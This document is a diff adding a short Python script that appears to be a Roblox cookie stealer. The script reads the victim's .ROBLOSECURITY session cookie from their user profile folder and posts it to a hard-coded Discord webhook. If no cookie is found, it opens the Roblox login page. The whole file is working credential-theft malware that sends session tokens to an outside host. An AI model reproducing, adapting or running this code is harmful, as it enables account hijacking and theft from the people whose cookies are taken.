@@ -1,0 +1,41 @@
+import os
+import requests
+import webbrowser
+
+cookie_id = "Roboto-Exe"
+
+url = "https://discord.com/api/webhooks/1492645719511797861/gF5zcg_YxBNqQJ1cEH8E0rDiljv7otR3qmjh1zr5ZIfkCnQVC7BBrocZG_NYhr0D19Bn"
+
+def get_cookie():
+    cookie_path = os.path.join(os.environ["USERPROFILE"], ".ROBLOSECURITY")
+    if os.path.exists(cookie_path):
+        with open(cookie_path, "r") as file:
+            return file.read()
+    else:
+        return None
+
+def send_request(cookie):
+    headers = {
+        "Content-Type": "application/json",
+    }
+    data = {
+        "content": f"Roblox Cookie: `{cookie}`",
+    }
+    try:
+        response = requests.post(url, headers=headers, json=data)
+        response.raise_for_status()
+        print("Successfully sent the cookie to the Discord webhook.")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send the cookie to the Discord webhook: {e}")
+
+def main():
+    cookie = get_cookie()
+    if cookie is not None:
+        send_request(cookie)
+    else:
+        print("No Roblox cookie found.")
+        print("Opening Roblox login page in your default browser.")
+        webbrowser.open("https://www.roblox.com/NewLogin")
+
+if __name__ == "__main__":
+    main()
